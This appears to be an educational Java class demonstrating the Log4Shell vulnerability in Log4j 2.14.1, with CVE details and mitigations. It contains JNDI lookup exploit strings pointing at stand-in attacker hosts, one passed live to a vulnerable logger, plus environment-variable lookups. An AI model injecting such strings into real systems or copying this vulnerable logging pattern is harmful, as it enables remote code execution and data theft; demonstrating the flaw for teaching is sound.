package com.example.javaapp;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * WARNING: This class demonstrates the Log4Shell vulnerability (CVE-2021-44228)
 * DO NOT USE IN PRODUCTION!
 * 
 * This is for educational/demonstration purposes only to show how the
 * vulnerable Log4j version (2.14.1) can be exploited through JNDI lookup.
 */
public class VulnerableDemo {
    private static final Logger logger = LogManager.getLogger(VulnerableDemo.class);

    public static void main(String[] args) {
        logger.info("=== Log4Shell Vulnerability Demonstration ===");
        logger.warn("Using Log4j version 2.14.1 - VULNERABLE to CVE-2021-44228");
        
        // Simulate user input being logged (common vulnerability vector)
        String userInput = "${java:version}";
        logger.info("User input logged: {}", userInput);
        
        // More vulnerable patterns
        logger.info("System user: ${env:USERNAME}");
        logger.info("Java home: ${env:JAVA_HOME}");
        
        // The infamous Log4Shell exploit pattern (DO NOT USE WITH REAL MALICIOUS SERVERS!)
        // This would normally be: ${jndi:ldap://malicious-server.com/exploit}
        logger.warn("Vulnerable pattern example (safe): ${jndi:ldap://example.com/a}");
        
        logger.error("=== SECURITY WARNING ===");
        logger.error("This application is using Log4j 2.14.1 which contains:");
        logger.error("- CVE-2021-44228 (Log4Shell) - CRITICAL (CVSS 10.0)");
        logger.error("- CVE-2021-45046 - CRITICAL (CVSS 9.0)");
        logger.error("- CVE-2021-45105 - HIGH (CVSS 7.5)");
        logger.error("Upgrade to Log4j 2.17.0 or higher immediately!");
        
        displayVulnerabilityInfo();
    }
    
    private static void displayVulnerabilityInfo() {
        System.out.println("\n" + "=".repeat(70));
        System.out.println("VULNERABILITY INFORMATION");
        System.out.println("=".repeat(70));
        System.out.println("CVE ID: CVE-2021-44228 (Log4Shell)");
        System.out.println("Severity: CRITICAL (CVSS Score: 10.0)");
        System.out.println("Affected: Log4j 2.0-beta9 through 2.14.1");
        System.out.println("Description: Remote Code Execution via JNDI lookup");
        System.out.println("\nHow it works:");
        System.out.println("1. Attacker sends malicious input with JNDI lookup string");
        System.out.println("2. Log4j processes the input and performs JNDI lookup");
        System.out.println("3. Remote code is downloaded and executed");
        System.out.println("\nExample exploit pattern:");
        System.out.println("   ${jndi:ldap://attacker.com/malicious}");
        System.out.println("\nMitigation:");
        System.out.println("- Upgrade to Log4j 2.17.0 or higher");
        System.out.println("- Or set system property: -Dlog4j2.formatMsgNoLookups=true");
        System.out.println("- Or set environment variable: LOG4J_FORMAT_MSG_NO_LOOKUPS=true");
        System.out.println("=".repeat(70) + "\n");
    }
}
